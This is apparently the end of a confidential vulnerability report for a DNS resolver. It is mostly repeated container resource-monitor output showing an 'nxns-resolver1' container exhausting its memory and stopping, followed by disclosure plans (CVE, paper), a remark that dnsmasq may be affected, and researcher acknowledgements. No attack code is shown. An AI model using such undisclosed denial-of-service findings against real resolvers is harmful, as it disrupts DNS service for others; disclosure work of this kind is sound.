bc4d1f763d1d   nxns-resolver1   202.81%   2GiB / 2GiB         99.99%    27MB / 22.2MB   467MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   202.81%   2GiB / 2GiB         99.99%    27MB / 22.2MB   467MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   202.81%   2GiB / 2GiB         99.99%    27MB / 22.2MB   467MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   202.81%   2GiB / 2GiB         99.99%    27MB / 22.2MB   467MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   202.81%   2GiB / 2GiB         99.99%    27MB / 22.2MB   467MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   202.81%   2GiB / 2GiB         99.99%    27MB / 22.2MB   467MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   194.58%   1.999GiB / 2GiB     99.94%    27.1MB / 22.2MB   518MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   194.58%   1.999GiB / 2GiB     99.94%    27.1MB / 22.2MB   518MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   194.58%   1.999GiB / 2GiB     99.94%    27.1MB / 22.2MB   518MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   194.58%   1.999GiB / 2GiB     99.94%    27.1MB / 22.2MB   518MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   198.34%   1.998GiB / 2GiB     99.88%    27.2MB / 22.3MB   562MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   198.34%   1.998GiB / 2GiB     99.88%    27.2MB / 22.3MB   562MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   198.34%   1.998GiB / 2GiB     99.88%    27.2MB / 22.3MB   562MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   198.34%   1.998GiB / 2GiB     99.88%    27.2MB / 22.3MB   562MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.59%   2GiB / 2GiB         99.98%    27.3MB / 22.4MB   609MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.59%   2GiB / 2GiB         99.98%    27.3MB / 22.4MB   609MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.59%   2GiB / 2GiB         99.98%    27.3MB / 22.4MB   609MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.59%   2GiB / 2GiB         99.98%    27.3MB / 22.4MB   609MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   183.74%   1.999GiB / 2GiB     99.95%    27.4MB / 22.4MB   655MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   183.74%   1.999GiB / 2GiB     99.95%    27.4MB / 22.4MB   655MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   183.74%   1.999GiB / 2GiB     99.95%    27.4MB / 22.4MB   655MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   183.74%   1.999GiB / 2GiB     99.95%    27.4MB / 22.4MB   655MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   146.61%   1.997GiB / 2GiB     99.87%    27.5MB / 22.5MB   691MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   146.61%   1.997GiB / 2GiB     99.87%    27.5MB / 22.5MB   691MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   146.61%   1.997GiB / 2GiB     99.87%    27.5MB / 22.5MB   691MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   146.61%   1.997GiB / 2GiB     99.87%    27.5MB / 22.5MB   691MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   133.91%   2GiB / 2GiB         99.98%    27.6MB / 22.6MB   722MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   133.91%   2GiB / 2GiB         99.98%    27.6MB / 22.6MB   722MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   133.91%   2GiB / 2GiB         99.98%    27.6MB / 22.6MB   722MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   133.91%   2GiB / 2GiB         99.98%    27.6MB / 22.6MB   722MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   194.16%   1.999GiB / 2GiB     99.94%    27.9MB / 22.8MB   763MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   194.16%   1.999GiB / 2GiB     99.94%    27.9MB / 22.8MB   763MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   194.16%   1.999GiB / 2GiB     99.94%    27.9MB / 22.8MB   763MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   194.16%   1.999GiB / 2GiB     99.94%    27.9MB / 22.8MB   763MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.92%   1.999GiB / 2GiB     99.97%    28.2MB / 23.1MB   801MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.92%   1.999GiB / 2GiB     99.97%    28.2MB / 23.1MB   801MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   197.92%   1.999GiB / 2GiB     99.97%    28.2MB / 23.1MB   801MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   197.92%   1.999GiB / 2GiB     99.97%    28.2MB / 23.1MB   801MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   169.21%   2GiB / 2GiB         100.00%   28.4MB / 23.3MB   840MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   169.21%   2GiB / 2GiB         100.00%   28.4MB / 23.3MB   840MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   169.21%   2GiB / 2GiB         100.00%   28.4MB / 23.3MB   840MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   169.21%   2GiB / 2GiB         100.00%   28.4MB / 23.3MB   840MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   158.33%   1.999GiB / 2GiB     99.97%    28.6MB / 23.4MB   887MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   158.33%   1.999GiB / 2GiB     99.97%    28.6MB / 23.4MB   887MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   158.33%   1.999GiB / 2GiB     99.97%    28.6MB / 23.4MB   887MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   158.33%   1.999GiB / 2GiB     99.97%    28.6MB / 23.4MB   887MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   158.33%   1.999GiB / 2GiB     99.97%    28.6MB / 23.4MB   887MB / 8.19kB   243
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   158.33%   1.999GiB / 2GiB     99.97%    28.6MB / 23.4MB   887MB / 8.19kB   243 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   168.84%   761.9MiB / 2GiB     37.20%    28.7MB / 23.5MB   913MB / 8.19kB   3
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   168.84%   761.9MiB / 2GiB     37.20%    28.7MB / 23.5MB   913MB / 8.19kB   3 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   168.84%   761.9MiB / 2GiB     37.20%    28.7MB / 23.5MB   913MB / 8.19kB   3
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   168.84%   761.9MiB / 2GiB     37.20%    28.7MB / 23.5MB   913MB / 8.19kB   3 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS
bc4d1f763d1d   nxns-resolver1   168.84%   761.9MiB / 2GiB     37.20%    28.7MB / 23.5MB   913MB / 8.19kB   3
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O           BLOCK I/O        PIDS [K
bc4d1f763d1d   nxns-resolver1   168.84%   761.9MiB / 2GiB     37.20%    28.7MB / 23.5MB   913MB / 8.19kB   3 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   0.00%     0B / 0B             0.00%     0B / 0B   0B / 0B     0 [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   --        -- / --             --        --        --          --
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   --        -- / --             --        --        --          -- [K
 [K
[J[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS
bc4d1f763d1d   nxns-resolver1   --        -- / --             --        --        --          --
[HCONTAINER ID   NAME             CPU %     MEM USAGE / LIMIT   MEM %     NET I/O   BLOCK I/O   PIDS [K
bc4d1f763d1d   nxns-resolver1   --        -- / --             --        --        --          -- [K
 [K
[J
```

### Coordination

- Does this issue affect multiple implementations?

This issue could also cause dnsmasq to suffer the same consequences. I have not yet tested other implementations.

- Have you shared the information with anyone else?

No, I only informed my other colleagues in the lab.


- What is your plan to publicize this issue?

We plan to apply for a CVE vulnerability and publish a conference paper.


### Acknowledgements

Jun Kong,School of Cybersecurity, Northwestern Polytechnical University
Jiapeng Li,School of Cybersecurity, Northwestern Polytechnical University
Mingkai Yu,School of Cybersecurity, Northwestern Polytechnical University

<!-- DO NOT modify the following two lines. -->

/label ~Bug ~Security
/confidential
